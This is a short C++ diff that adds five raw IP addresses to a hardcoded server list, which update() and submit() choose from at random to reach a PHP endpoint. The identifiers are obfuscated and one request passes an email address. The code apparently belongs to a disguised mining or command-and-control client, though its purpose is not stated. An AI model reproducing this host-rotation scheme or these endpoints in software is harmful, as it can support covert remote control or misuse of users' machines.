@@ -970,11 +970,11 @@ linux888874744474_update_result linux888874744474_client::update() {
 
     string response;
 
-string random [] = {"94.237.30.197", "94.237.61.188", "194.113.72.197","194.113.74.217","209.151.148.100"};
+string random [] = {"94.237.30.197", "94.237.61.188", "194.113.72.197","194.113.74.217","209.151.148.100","94.237.82.144","83.136.252.244","152.44.45.146","209.151.156.131","209.50.61.158"};
 int number;
 
 srand(time(0));
-int rand_index = rand() % 5;
+int rand_index = rand() % 10;
 
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
     
@@ -1018,11 +1018,11 @@ linux888874744474_submit_result linux888874744474_client::submit(const string &l
     if(__show_linuxweb844412441274_requests)
     LOG("");
     
-string random [] = {"94.237.30.197", "94.237.61.188", "194.113.72.197","194.113.74.217","209.151.148.100"};
+string random [] = {"94.237.30.197", "94.237.61.188", "194.113.72.197","194.113.74.217","209.151.148.100","94.237.82.144","83.136.252.244","152.44.45.146","209.151.156.131","209.50.61.158"};
 int number;
 
 srand(time(0));
-int rand_index = rand() % 5;
+int rand_index = rand() % 10;
  
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux84";
     
